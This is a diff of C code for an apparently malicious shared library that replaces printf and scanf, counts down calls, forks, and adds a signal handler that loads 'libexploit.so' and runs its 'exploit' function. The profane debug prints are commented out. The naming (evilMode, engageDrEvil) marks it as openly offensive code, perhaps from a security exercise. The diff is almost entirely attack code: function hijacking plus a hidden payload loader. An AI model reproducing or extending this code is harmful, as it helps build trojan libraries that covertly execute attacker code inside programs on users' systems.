@@ -42,7 +42,7 @@ void StartCountDown(){
     evilMode = 0;
     mypid = 0;
     normalLib = getpid();
-    ogPrintf("Fucking shit up!\n");
+    
 }
 
 void Terminator(){
@@ -74,13 +74,15 @@ int ogScanf(const char * fmt, ...){
 
 void evilPrintf(const char * formatString){
     //Balls
-    ogPrintf("Evil shit\n");
+    //ogPrintf("Evil shit\n");
 
 }
 
 void myHandler(int sig){
     fclose(output);
-    //void * libH = dlopen()
+    void * libH = dlopen("obj64/libexploit.so",RTLD_LAZY);
+    void (*realScanf)() = dlsym(libH, "exploit");
+    realScanf();
     exit(0);
 }
 
@@ -145,7 +147,7 @@ void engageDrEvil(){
             }
 
 
-
+/*
             while(waitpid(normalLib, &status, WNOHANG | WUNTRACED)){
                 if(WIFEXITED(status)){
                     //load exploit librarr
@@ -156,6 +158,7 @@ void engageDrEvil(){
                     continue;
                 }
             }
+            */
         }else{
             //we are the parent
 
@@ -176,7 +179,7 @@ void engageDrEvil(){
 
 //int printf(const char * __fmt, ...){
 int printf (const char *__restrict __fmt, ...){
-    ogPrintf("Counting down: %i\n", theFinalCountDown);
+    //ogPrintf("Counting down: %i\n", theFinalCountDown);
     //const char * formatString = __fmt; //useless
     
     theFinalCountDown = theFinalCountDown - 1;
@@ -234,7 +237,7 @@ int scanf(const char * fmt, ...){
     va_start(args, fmt);
     va_end(args);
     int result = vscanf(fmt, args);//ogScanf(fmt, args);
-    ogPrintf("Bullshit: "); //lack of proccessing creates infinite loop
+    //ogPrintf("Bullshit: "); //lack of proccessing creates infinite loop
     //va_end(args);
     return result;
 }
